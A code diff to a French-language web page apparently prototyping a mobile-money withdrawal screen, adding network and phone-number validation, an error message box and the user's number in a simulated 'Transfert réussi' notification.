@@ -64,6 +64,27 @@ body{
 }
 
 /* =========================
+   VALIDATION
+========================= */
+
+.validation-error{
+    display:none;
+    background:#ffe8e8;
+    color:#c62828;
+    border:1px solid #ffcaca;
+    border-radius:12px;
+    padding:10px;
+    margin-bottom:13px;
+    font-size:13px;
+    font-weight:bold;
+    text-align:center;
+}
+
+.validation-error.show{
+    display:block;
+}
+
+/* =========================
    ÉCRAN INITIAL
 ========================= */
 
@@ -401,6 +422,7 @@ body{
     color:#fff;
     font-size:12px;
     font-weight:bold;
+    cursor:pointer;
 }
 
 .network.selected{
@@ -466,9 +488,7 @@ body{
 
 <body>
 
-<!-- =========================
-     NOTIFICATION PROTOTYPE
-========================= -->
+<!-- NOTIFICATION PROTOTYPE -->
 
 <div class="prototype-notification" id="prototypeNotification">
 
@@ -481,9 +501,7 @@ body{
 </div>
 
 
-<!-- =========================
-     MESSAGE INITIAL
-========================= -->
+<!-- MESSAGE INITIAL -->
 
 <div class="access-message" id="messageScreen">
 
@@ -511,9 +529,7 @@ body{
 </div>
 
 
-<!-- =========================
-     CODE
-========================= -->
+<!-- CODE -->
 
 <div class="code-screen" id="codeScreen">
 
@@ -552,9 +568,7 @@ body{
 </div>
 
 
-<!-- =========================
-     TABLEAU
-========================= -->
+<!-- TABLEAU -->
 
 <div class="dashboard" id="dashboard">
 
@@ -603,6 +617,9 @@ body{
         </div>
 
     </div>
+
+
+    <div class="validation-error" id="validationError"></div>
 
 
     <button class="withdraw" id="withdrawBtn" type="button">
@@ -843,6 +860,9 @@ function afficherNotification(){
     const montantActuel =
         document.getElementById("amount").textContent;
 
+    const numero =
+        document.getElementById("phone").value.trim();
+
     const maintenant = new Date();
 
     const date =
@@ -865,6 +885,8 @@ function afficherNotification(){
         date +
         " à " +
         heure +
+        " sur votre numéro " +
+        numero +
         "<br>" +
         "Nouveau solde :";
 
@@ -910,7 +932,55 @@ const networks =
 const formBox =
     document.getElementById("formBox");
 
+const phone =
+    document.getElementById("phone");
+
+const validationError =
+    document.getElementById("validationError");
+
+
+/* =========================
+   VALIDATION + RETRAIT
+========================= */
+
 withdrawBtn.addEventListener("click",function(){
+
+    const numero = phone.value.trim();
+
+    const reseau = selectedNetwork.textContent.trim();
+
+
+    /* Réseau obligatoire */
+
+    if(reseau === "Aucun réseau sélectionné"){
+
+        validationError.textContent =
+            "Veuillez sélectionner un réseau avant de continuer.";
+
+        validationError.classList.add("show");
+
+        return;
+    }
+
+
+    /* Numéro obligatoire */
+
+    if(numero === ""){
+
+        validationError.textContent =
+            "Veuillez saisir votre numéro de retrait avant de continuer.";
+
+        validationError.classList.add("show");
+
+        phone.focus();
+
+        return;
+    }
+
+
+    /* Tout est renseigné */
+
+    validationError.classList.remove("show");
 
     mainCard.style.display = "none";
 
@@ -927,7 +997,9 @@ withdrawBtn.addEventListener("click",function(){
     transferStatus.classList.add("show");
 
 
-    /* Résultat après 10 secondes */
+    /* =========================
+       FIN DU TRAITEMENT
+    ========================= */
 
     setTimeout(function(){
 
@@ -935,15 +1007,18 @@ withdrawBtn.addEventListener("click",function(){
 
         result.classList.add("show");
 
+
         /*
-         * La notification apparaît seulement
-         * APRÈS l'affichage de "Transfert réussi !"
+         * La notification apparaît
+         * après "Transfert réussi !"
          */
+
         setTimeout(function(){
 
             afficherNotification();
 
         },300);
+
 
     },10000);
 
